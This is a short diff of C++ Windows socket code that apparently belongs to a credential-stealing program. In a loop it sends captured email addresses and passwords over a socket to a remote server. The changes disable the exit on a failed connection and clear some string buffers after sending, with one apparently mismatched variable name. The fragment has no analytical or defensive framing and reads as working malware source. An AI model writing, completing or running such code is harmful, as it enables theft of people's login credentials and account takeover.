@@ -29,14 +29,14 @@
         
         int connResult = connect(sock, (sockaddr*)&hint, sizeof(hint));
 
-        /*
+        
         if (connResult == SOCKET_ERROR)
         {        
             closesocket(sock);
             WSACleanup();
-            ExitProcess(EXIT_FAILURE);
+            //ExitProcess(EXIT_FAILURE);
         }
-        */
+        
 
 
         while(1)
@@ -49,9 +49,12 @@
                 EmailSend = string(EmailStr.begin(), EmailStr.end());
                 PasswordSend = string(PasswordStr.begin(), PasswordStr.end());
 
+
                 int sendResult = send(sock,EmailSend.c_str(), EmailSend.size() , 0);
                 int sendResult2 = send(sock, PasswordSend.c_str(), PasswordSend.size(), 0);
 
+                EmailSend.clear();
+                PasswordStr.clear();
 
                 if (sendResult != SOCKET_ERROR)
                 {
